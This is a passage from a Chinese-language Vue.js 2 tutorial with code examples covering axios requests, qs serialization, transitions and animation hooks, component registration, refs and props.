<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &#123;&#123; info &#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      info: null</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    axios</span><br><span class="line">      .get(&apos;https://www.runoob.com/try/ajax/json_demo.json&apos;)</span><br><span class="line">      .then(response =&gt; (this.info = response))</span><br><span class="line">      .catch(function (error) &#123; // 请求失败处理</span><br><span class="line">        console.log(error);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用 response.data 读取 JSON 数据参考get方法</p>
<p>传递参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">axios.post(&apos;/user&apos;, &#123;</span><br><span class="line">    firstName: &apos;Fred&apos;,        // 参数 firstName</span><br><span class="line">    lastName: &apos;Flintstone&apos;    // 参数 lastName</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>post请求格式为form-data：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form-data:?name=wisejay&amp;age=18</span><br></pre></td></tr></table></figure>

<p>需要将post转化为x-<a href="http://www.form-urlencoded" target="_blank" rel="noopener">www.form-urlencoded</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-www.form-urlencoded:&#123;name=&quot;wisejay&quot;,age=&quot;18&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="qs方法"><a href="#qs方法" class="headerlink" title="qs方法"></a>qs方法</h2><p><code>npm install qs</code></p>
<ul>
<li>将对象序列化多个对象之间用&amp;拼接</li>
</ul>
<p>qs.stringify()    转换成查询字符串</p>
<ul>
<li>将序列化的内容拆分成一个个单一的对象</li>
</ul>
<p>qs.parse() 转换成json对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import qs from &quot;qs&quot;</span><br><span class="line">axios.post(&apos;/user&apos;,qs.stringify &#123;</span><br><span class="line">    firstName: &apos;Fred&apos;,        // 参数 firstName</span><br><span class="line">    lastName: &apos;Flintstone&apos;    // 参数 lastName</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="更多参考："><a href="#更多参考：" class="headerlink" title="更多参考："></a>更多参考：</h2><p><a href="https://github.com/axios/axios" target="_blank" rel="noopener">https://github.com/axios/axios</a></p>
<p><a href="https://www.runoob.com/vue2/vuejs-ajax-axios.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vuejs-ajax-axios.html</a></p>
<h1 id="过渡-amp-动画"><a href="#过渡-amp-动画" class="headerlink" title="过渡 &amp; 动画"></a>过渡 &amp; 动画</h1><h2 id="内置"><a href="#内置" class="headerlink" title="内置"></a>内置</h2><p>Vue在元素显示与隐藏的过渡中，提供了 6 个 class 来切换:</p>
<ul>
<li><code>v-enter</code>：定义进入过渡的开始状态。在元素被插入之前生效，在元素被插入之后的下一帧移除。</li>
<li><code>v-enter-active</code>：定义进入过渡生效时的状态。在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡/动画完成之后移除。这个类可以被用来定义进入过渡的过程时间，延迟和曲线函数。</li>
<li><code>v-enter-to</code>: <strong>2.1.8版及以上</strong> 定义进入过渡的结束状态。在元素被插入之后下一帧生效 (与此同时 <code>v-enter</code> 被移除)，在过渡/动画完成之后移除。</li>
<li><code>v-leave</code>: 定义离开过渡的开始状态。在离开过渡被触发时立刻生效，下一帧被移除。</li>
<li><code>v-leave-active</code>：定义离开过渡生效时的状态。在整个离开过渡的阶段中应用，在离开过渡被触发时立刻生效，在过渡/动画完成之后移除。这个类可以被用来定义离开过渡的过程时间，延迟和曲线函数。</li>
<li><code>v-leave-to</code>: <strong>2.1.8版及以上</strong> 定义离开过渡的结束状态。在离开过渡被触发之后下一帧生效 (与此同时 <code>v-leave</code> 被删除)，在过渡/动画完成之后移除。</li>
</ul>
<blockquote>
<p>对于这些在过渡中切换的类名来说，如果你使用一个没有名字的 <code>&lt;transition&gt;</code>，则 <code>v-</code> 是这些类名的默认前缀。如果你使用了 <code>&lt;transition name=&quot;my-transition&quot;&gt;</code>，那么 <code>v-enter</code> 会替换为 <code>my-transition-enter</code>。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">/* 可以设置不同的进入和离开动画 */</span><br><span class="line">/* 设置持续时间和动画函数 */</span><br><span class="line">.slide-fade-enter-active &#123;</span><br><span class="line">  transition: all .3s ease;</span><br><span class="line">&#125;</span><br><span class="line">.slide-fade-leave-active &#123;</span><br><span class="line">  transition: all .8s cubic-bezier(1.0, 0.5, 0.8, 1.0);</span><br><span class="line">&#125;</span><br><span class="line">.slide-fade-enter, .slide-fade-leave-to</span><br><span class="line">/* .slide-fade-leave-active 用于 2.1.8 以下版本 */ &#123;</span><br><span class="line">  transform: translateX(10px);</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id = &quot;databinding&quot;&gt;</span><br><span class="line">&lt;button v-on:click = &quot;show = !show&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;transition name=&quot;slide-fade&quot;&gt;</span><br><span class="line">    &lt;p v-if=&quot;show&quot;&gt;动画效果&lt;/p&gt;</span><br><span class="line">&lt;/transition&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &apos;#databinding&apos;,</span><br><span class="line">    data: &#123;</span><br><span class="line">        show: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="自定义过渡的类名CSS"><a href="#自定义过渡的类名CSS" class="headerlink" title="自定义过渡的类名CSS"></a>自定义过渡的类名CSS</h2><p><code>自定义过渡的类名优先级高于普通的类名</code></p>
<p>自定义过渡类名:</p>
<ul>
<li><code>enter-class</code></li>
<li><code>enter-active-class</code></li>
<li><code>enter-to-class</code> (2.1.8+)</li>
<li><code>leave-class</code></li>
<li><code>leave-active-class</code></li>
<li><code>leave-to-class</code> (2.1.8+)</li>
</ul>
<p><code>animate.css</code>为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=&quot;https://cdn.jsdelivr.net/npm/animate.css@3.5.1&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;div id = &quot;databinding&quot;&gt;</span><br><span class="line">&lt;button v-on:click = &quot;show = !show&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;transition</span><br><span class="line">    name=&quot;custom-classes-transition&quot;</span><br><span class="line">    enter-active-class=&quot;animated tada&quot;</span><br><span class="line">    leave-active-class=&quot;animated bounceOutRight&quot;</span><br><span class="line">&gt;</span><br><span class="line">    &lt;p v-if=&quot;show&quot;&gt;菜鸟教程 -- 学的不仅是技术，更是梦想！！！&lt;/p&gt;</span><br><span class="line">&lt;/transition&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &apos;#databinding&apos;,</span><br><span class="line">    data: &#123;</span><br><span class="line">        show: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-钩子"><a href="#JavaScript-钩子" class="headerlink" title="JavaScript 钩子"></a>JavaScript 钩子</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition</span><br><span class="line">  v-on:before-enter=&quot;beforeEnter&quot;</span><br><span class="line">  v-on:enter=&quot;enter&quot;</span><br><span class="line">  v-on:after-enter=&quot;afterEnter&quot;</span><br><span class="line">  v-on:enter-cancelled=&quot;enterCancelled&quot;</span><br><span class="line"> </span><br><span class="line">  v-on:before-leave=&quot;beforeLeave&quot;</span><br><span class="line">  v-on:leave=&quot;leave&quot;</span><br><span class="line">  v-on:after-leave=&quot;afterLeave&quot;</span><br><span class="line">  v-on:leave-cancelled=&quot;leaveCancelled&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &lt;!-- ... --&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">methods: &#123;</span><br><span class="line">  // --------</span><br><span class="line">  // 进入中</span><br><span class="line">  // --------</span><br><span class="line"> </span><br><span class="line">  beforeEnter: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;,</span><br><span class="line">  // 此回调函数是可选项的设置</span><br><span class="line">  // 与 CSS 结合时使用</span><br><span class="line">  enter: function (el, done) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    done()</span><br><span class="line">  &#125;,</span><br><span class="line">  afterEnter: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;,</span><br><span class="line">  enterCancelled: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  // --------</span><br><span class="line">  // 离开时</span><br><span class="line">  // --------</span><br><span class="line"> </span><br><span class="line">  beforeLeave: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;,</span><br><span class="line">  // 此回调函数是可选项的设置</span><br><span class="line">  // 与 CSS 结合时使用</span><br><span class="line">  leave: function (el, done) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    done()</span><br><span class="line">  &#125;,</span><br><span class="line">  afterLeave: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;,</span><br><span class="line">  // leaveCancelled 只用于 v-show 中</span><br><span class="line">  leaveCancelled: function (el) &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id = &quot;databinding&quot;&gt;</span><br><span class="line">&lt;button v-on:click = &quot;show = !show&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;transition</span><br><span class="line">    v-on:before-enter=&quot;beforeEnter&quot;</span><br><span class="line">    v-on:enter=&quot;enter&quot;</span><br><span class="line">    v-on:leave=&quot;leave&quot;</span><br><span class="line">    v-bind:css=&quot;false&quot;</span><br><span class="line">  &gt;</span><br><span class="line">    &lt;p v-if=&quot;show&quot;&gt;动画效果&lt;/p&gt;</span><br><span class="line">&lt;/transition&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type = &quot;text/javascript&quot;&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#databinding&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    show: false</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    beforeEnter: function (el) &#123;</span><br><span class="line">      el.style.opacity = 0</span><br><span class="line">      el.style.transformOrigin = &apos;left&apos;</span><br><span class="line">    &#125;,</span><br><span class="line">    enter: function (el, done) &#123;</span><br><span class="line">      Velocity(el, &#123; opacity: 1, fontSize: &apos;1.4em&apos; &#125;, &#123; duration: 300 &#125;)</span><br><span class="line">      Velocity(el, &#123; fontSize: &apos;1em&apos; &#125;, &#123; complete: done &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    leave: function (el, done) &#123;</span><br><span class="line">      Velocity(el, &#123; translateX: &apos;15px&apos;, rotateZ: &apos;50deg&apos; &#125;, &#123; duration: 600 &#125;)</span><br><span class="line">      Velocity(el, &#123; rotateZ: &apos;100deg&apos; &#125;, &#123; loop: 2 &#125;)</span><br><span class="line">      Velocity(el, &#123;</span><br><span class="line">        rotateZ: &apos;45deg&apos;,</span><br><span class="line">        translateY: &apos;30px&apos;,</span><br><span class="line">        translateX: &apos;30px&apos;,</span><br><span class="line">        opacity: 0</span><br><span class="line">      &#125;, &#123; complete: done &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="初始渲染的过渡"><a href="#初始渲染的过渡" class="headerlink" title="初始渲染的过渡"></a>初始渲染的过渡</h1><h2 id="内置-1"><a href="#内置-1" class="headerlink" title="内置"></a>内置</h2><p>这里默认和进入/离开过渡一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--tag标签为可选，如果不指定渲染为span标签--&gt;</span><br><span class="line">&lt;transition appear tag=&apos;ul&apos;&gt;</span><br><span class="line">  &lt;!-- ... --&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<h2 id="自定义CSS"><a href="#自定义CSS" class="headerlink" title="自定义CSS"></a>自定义CSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition</span><br><span class="line">  appear</span><br><span class="line">  appear-class=&quot;custom-appear-class&quot;</span><br><span class="line">  appear-to-class=&quot;custom-appear-to-class&quot; (2.1.8+)</span><br><span class="line">  appear-active-class=&quot;custom-appear-active-class&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &lt;!-- ... --&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<h2 id="自定义-JavaScript-钩子"><a href="#自定义-JavaScript-钩子" class="headerlink" title="自定义 JavaScript 钩子"></a>自定义 JavaScript 钩子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition</span><br><span class="line">  appear</span><br><span class="line">  v-on:before-appear=&quot;customBeforeAppearHook&quot;</span><br><span class="line">  v-on:appear=&quot;customAppearHook&quot;</span><br><span class="line">  v-on:after-appear=&quot;customAfterAppearHook&quot;</span><br><span class="line">  v-on:appear-cancelled=&quot;customAppearCancelledHook&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &lt;!-- ... --&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<h1 id="多个元素的过渡"><a href="#多个元素的过渡" class="headerlink" title="多个元素的过渡"></a>多个元素的过渡</h1><p><code>当有相同标签名的元素切换时，需要通过 key 特性设置唯一的值来标记以让 Vue 区分它们，否则 Vue 为了效率只会替换相同标签内部的内容</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition&gt;</span><br><span class="line">  &lt;button v-if=&quot;isEditing&quot; key=&quot;save&quot;&gt;</span><br><span class="line">    Save</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">  &lt;button v-else key=&quot;edit&quot;&gt;</span><br><span class="line">    Edit</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure>

<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h2 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h2><p>语法格式：</p>
<p><code>Vue.component(tagName, options)</code></p>
<p>tagName 为组件名，options 为配置选项。注册后，我们可以使用以下方式来调用组件：</p>
<p><code>&lt;tagName&gt;&lt;/tagName&gt;</code></p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;test&gt;&lt;/test&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 注册</span><br><span class="line">Vue.component(&apos;test&apos;, &#123;</span><br><span class="line">  template: &apos;&lt;h1&gt;自定义组件!&lt;/h1&gt;&apos;</span><br><span class="line">&#125;)</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;test&gt;&lt;/test&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    // &lt;runoob&gt; 将只在父模板可用</span><br><span class="line">    &apos;test&apos;: &#123;</span><br><span class="line">        template: &apos;&lt;h1&gt;自定义组件!&lt;/h1&gt;&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="组件中的Data必须为函数"><a href="#组件中的Data必须为函数" class="headerlink" title="组件中的Data必须为函数"></a>组件中的Data必须为函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;test&gt;&lt;/test&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 注册</span><br><span class="line">Vue.component(&apos;test&apos;, &#123;</span><br><span class="line">  template: &apos;&lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;/h1&gt;&apos;,</span><br><span class="line">  data: function()&#123;</span><br><span class="line">      return&#123;</span><br><span class="line">          msg:&apos;组件中的data&apos;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="component元素"><a href="#component元素" class="headerlink" title="component元素"></a>component元素</h2><p><code>component是一个占位符，:is属性，可以用来指定要展示的组件名称</code></p>
<p>展示login组件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;componet :is=&quot; &apos;login&apos; &quot;&gt;&lt;/componet&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ref使用"><a href="#ref使用" class="headerlink" title="ref使用"></a>ref使用</h2><p>``ref<code>被用来给元素或子组件注册引用信息</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">      &lt;h1&gt;&#123;&#123; message &#125;&#125;&lt;/h1&gt;</span><br><span class="line">      &lt;button ref=&quot;myButton&quot; @click=&quot;clickedButton&quot;&gt;点击&lt;/button&gt;</span><br><span class="line">      &lt;com-name&gt;&lt;/com-name&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=&gt;</span><br><span class="line">    // 自定义组件</span><br><span class="line">    let com = Vue.component(&apos;com-name&apos;,&#123;</span><br><span class="line">        template: &quot;&lt;button ref=&apos;myzi&apos; @click=&apos;show&apos;&gt;自定义组件&lt;/button&gt;&quot;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            show()&#123;</span><br><span class="line">                console.log(this.$refs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    let app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data () &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: &apos;Hi!&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            clickedButton: function () &#123;</span><br><span class="line">                console.log(this.$refs)</span><br><span class="line">                this.$refs.myButton.innerText = this.message</span><br><span class="line">            &#125;       </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="组件传值"><a href="#组件传值" class="headerlink" title="组件传值"></a>组件传值</h1><p><code>prop 是单向绑定的：当父组件的属性变化时，将传导给子组件，但是不会反过来</code></p>
<h2 id="Prop"><a href="#Prop" class="headerlink" title="Prop"></a>Prop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;child message=&quot;hello!&quot;&gt;&lt;/child&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 注册</span><br><span class="line">Vue.component(&apos;child&apos;, &#123;</span><br><span class="line">  // 声明 props</span><br><span class="line">  props: [&apos;message&apos;],</span><br><span class="line">  // 同样也可以在 vm 实例中像 “this.message” 这样使用</span><br><span class="line">  template: &apos;&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&apos;</span><br><span class="line">&#125;)</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

